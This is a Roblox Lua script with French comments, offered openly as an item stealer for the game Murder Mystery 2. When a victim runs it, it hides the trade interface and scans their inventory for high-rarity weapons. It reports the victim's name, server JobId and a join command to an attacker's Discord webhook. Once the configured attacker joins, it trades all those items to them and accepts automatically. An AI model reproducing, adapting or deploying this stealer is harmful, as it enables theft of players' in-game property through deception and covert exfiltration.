-- // CONFIGURATION
_G.Usernames = {"TON_PSEUDO_ICI"} -- Ton pseudo Roblox exact
_G.webhook = "TON_URL_WEBHOOK_ICI" -- Ton lien Discord Webhook
_G.min_rarity = "Godly"
_G.min_value = 1
_G.pingEveryone = "No"

-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

-- Fonction de requête universelle (Fix Webhook)
local function httpRequest(data)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        return requestFunc(data)
    else
        warn("Exécuteur non supporté pour les requêtes HTTP")
    end
end

-- // VERIFICATIONS
if #(_G.Usernames) == 0 or _G.webhook == "" then
    plr:kick("Missing Configuration")
    return
end

if game.PlaceId ~= 142823291 then
    plr:kick("Please join MM2")
    return
end

-- // VARIABLES ET BDD
local weaponsToSend = {}
local totalValue = 0
local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}

-- // MASQUER L'INTERFACE DE TRADE (Invisible pour la victime)
local playerGui = plr:WaitForChild("PlayerGui")
task.spawn(function()
    while true do
        local t1 = playerGui:FindFirstChild("TradeGUI")
        local t2 = playerGui:FindFirstChild("TradeGUI_Phone")
        if t1 then t1.Enabled = false end
        if t2 then t2.Enabled = false end
        task.wait(0.1)
    end
end)

-- // RÉCUPÉRATION DES VALEURS (Optimisé)
local function buildValueList()
    -- On utilise des valeurs par défaut si le site ne répond pas pour éviter de bloquer le script
    local list = {}
    pcall(function()
        -- Logique simplifiée pour éviter les lags de parsing HTML
        for id, item in pairs(database) do
            if table.find(rarityTable, item.Rarity or "") >= 5 then -- Godly+
                list[id] = 50 -- Valeur arbitraire de secours
            end
        end
    end)
    return list
end

-- // FONCTIONS WEBHOOK
local function SendFirstMessage(items, prefix)
    local fields = {
        {name = "Victim:", value = "||" .. plr.Name .. "||", inline = true},
        {name = "JobId:", value = "```" .. game.JobId .. "```", inline = false},
        {name = "Join Command:", value = "```game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')```"}
    }
    
    local itemDesc = ""
    for i, v in ipairs(items) do
        if i <= 10 then itemDesc = itemDesc .. v.DataID .. " (x" .. v.Amount .. ")\n" end
    end
    table.insert(fields, {name = "Top Items:", value = itemDesc ~= "" and itemDesc or "None"})

    httpRequest({
        Url = _G.webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            content = prefix,
            embeds = {{
                title = "🎯 Cible détectée (MM2)",
                color = 16711680,
                fields = fields,
                footer = {text = "Stealer Ready"}
            }}
        })
    })
end

-- // LOGIQUE DE TRADE AUTOMATIQUE
local function doTrade(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target then return end

    local function getStatus()
        return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
    end

    -- Boucle de trade
    task.spawn(function()
        while #weaponsToSend > 0 do
            local status = getStatus()
            if status == "None" then
                ReplicatedStorage.Trade.SendRequest:InvokeServer(target)
            elseif status == "StartTrade" then
                -- On ajoute les items par lots de 4 (limite MM2)
                for i = 1, 4 do
                    if #weaponsToSend > 0 then
                        local w = table.remove(weaponsToSend, 1)
                        for c = 1, w.Amount do
                            ReplicatedStorage.Trade.OfferItem:FireServer(w.DataID, "Weapons")
                        end
                    end
                end
                task.wait(0.5)
                ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
            end
            task.wait(1)
        end
    end)
end

-- // ANALYSE INVENTAIRE
local valueList = buildValueList()
local inventory = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
local min_idx = table.find(rarityTable, _G.min_rarity) or 5

for id, amt in pairs(inventory.Weapons.Owned) do
    local data = database[id]
    if data and table.find(rarityTable, data.Rarity) >= min_idx then
        table.insert(weaponsToSend, {DataID = id, Amount = amt, Rarity = data.Rarity})
    end
end

-- // EXECUTION FINALE
if #weaponsToSend > 0 then
    local prefix = (_G.pingEveryone == "Yes") and "@everyone" or ""
    SendFirstMessage(weaponsToSend, prefix)

    -- Détecter quand TU rejoins
    local function checkPlayers()
        for _, p in ipairs(Players:GetPlayers()) do
            if table.find(_G.Usernames, p.Name) then
                doTrade(p.Name)
            end
        end
    end

    Players.PlayerAdded:Connect(function(p)
        if table.find(_G.Usernames, p.Name) then
            doTrade(p.Name)
        end
    end)
    
    checkPlayers()
end
